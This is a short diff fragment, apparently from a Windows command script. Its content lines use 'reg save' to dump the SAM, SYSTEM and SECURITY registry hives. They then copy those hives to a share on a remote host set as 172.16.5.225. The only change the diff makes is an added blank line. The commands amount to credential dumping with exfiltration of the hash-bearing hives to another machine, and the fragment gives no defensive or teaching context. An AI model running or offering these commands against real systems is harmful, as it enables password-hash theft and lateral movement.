@@ -10,6 +10,7 @@ reg save hklm\sam sam.save
 reg save hklm\system system.save
 reg save hklm\security security.save
 
+
 SET TARGET=172.16.5.225
 reg save hklm\sam \\%TARGET%\share\sam.save
 reg save hklm\system \\%TARGET%\share\system.save
